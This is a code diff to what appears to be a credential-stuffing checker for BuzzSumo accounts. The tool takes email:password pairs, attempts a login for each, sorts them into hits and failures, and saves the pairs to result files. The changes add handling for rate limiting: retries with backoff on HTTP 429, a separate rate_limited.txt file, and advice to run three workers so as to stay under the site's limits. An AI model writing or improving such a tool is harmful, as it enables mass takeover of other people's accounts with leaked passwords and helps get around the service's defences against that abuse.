@@ -20,9 +20,10 @@ import (
 type CheckStatus string
 
 const (
-	StatusHit    CheckStatus = "HIT"
-	StatusFail   CheckStatus = "FAIL"
-	StatusError  CheckStatus = "ERROR"
+	StatusHit          CheckStatus = "HIT"
+	StatusFail         CheckStatus = "FAIL"
+	StatusError        CheckStatus = "ERROR"
+	StatusRateLimited  CheckStatus = "RATE_LIMITED"
 )
 
 type CheckResult struct {
@@ -106,15 +107,16 @@ func (c *Checker) Check(email, password string) CheckResult {
 		"login_url":   c.cfg.LoginURL(),
 	}
 
-	// Step 1: GET login page
-	loginBody, loginStatus, err := c.doRequest(client, "GET", c.cfg.LoginURL(), map[string]string{
-		"Accept":          "text/html, application/xhtml+xml",
-		"Accept-Language": "en-US,en;q=0.9",
-		"User-Agent":      c.cfg.UserAgent,
-	}, "")
+	// Step 1: GET login page (retry on HTTP 429)
+	loginBody, loginStatus, err := c.fetchLoginPage(client)
 	if err != nil {
 		result.Status = StatusError
 		result.Reason = err.Error()
+		return result
+	}
+	if loginStatus == http.StatusTooManyRequests {
+		result.Status = StatusRateLimited
+		result.Reason = "BuzzSumo rate limit (HTTP 429) — use 3 workers or retry rate_limited.txt later"
 		return result
 	}
 	if loginStatus != http.StatusOK {
@@ -175,8 +177,12 @@ func (c *Checker) Check(email, password string) CheckResult {
 			return result
 		}
 	}
-	if postStatus == http.StatusUnauthorized || postStatus == http.StatusUnprocessableEntity ||
-		postStatus == http.StatusTooManyRequests || postStatus == 419 {
+	if postStatus == http.StatusTooManyRequests {
+		result.Status = StatusRateLimited
+		result.Reason = "login POST rate limited (HTTP 429)"
+		return result
+	}
+	if postStatus == http.StatusUnauthorized || postStatus == http.StatusUnprocessableEntity || postStatus == 419 {
 		result.Status = StatusFail
 		result.Reason = fmt.Sprintf("login HTTP %d", postStatus)
 		return result
@@ -281,6 +287,35 @@ func (c *Checker) doRequest(client *http.Client, method, rawURL string, headers 
 		return "", resp.StatusCode, err
 	}
 	return string(data), resp.StatusCode, nil
+}
+
+func (c *Checker) fetchLoginPage(client *http.Client) (string, int, error) {
+	retries := c.cfg.Settings.RetryOnError
+	if retries < 0 {
+		retries = 0
+	}
+	var body string
+	var status int
+	var err error
+	for attempt := 0; attempt <= retries; attempt++ {
+		body, status, err = c.doRequest(client, "GET", c.cfg.LoginURL(), map[string]string{
+			"Accept":          "text/html, application/xhtml+xml",
+			"Accept-Language": "en-US,en;q=0.9",
+			"User-Agent":      c.cfg.UserAgent,
+		}, "")
+		if err != nil {
+			return "", 0, err
+		}
+		if status == http.StatusOK {
+			return body, status, nil
+		}
+		if status == http.StatusTooManyRequests && attempt < retries {
+			time.Sleep(time.Duration(2*(attempt+1)) * time.Second)
+			continue
+		}
+		return body, status, nil
+	}
+	return body, status, nil
 }
 
 var dataPageRE = regexp.MustCompile(`data-page="([^"]+)"`)
@@ -508,6 +543,12 @@ func writeResultFiles(cfg *Config, r CheckResult, resultsDir string) error {
 	case StatusFail:
 		failLine := fmt.Sprintf("%s:%s | %s", r.Email, r.Password, r.Reason)
 		return appendLine(filepath.Join(resultsDir, "invalid.txt"), failLine)
+	case StatusRateLimited:
+		line := fmt.Sprintf("%s:%s | %s", r.Email, r.Password, r.Reason)
+		return appendLine(filepath.Join(resultsDir, "rate_limited.txt"), line)
+	case StatusError:
+		line := fmt.Sprintf("%s:%s | %s", r.Email, r.Password, r.Reason)
+		return appendLine(filepath.Join(resultsDir, "errors.txt"), line)
 	}
 	return nil
 }
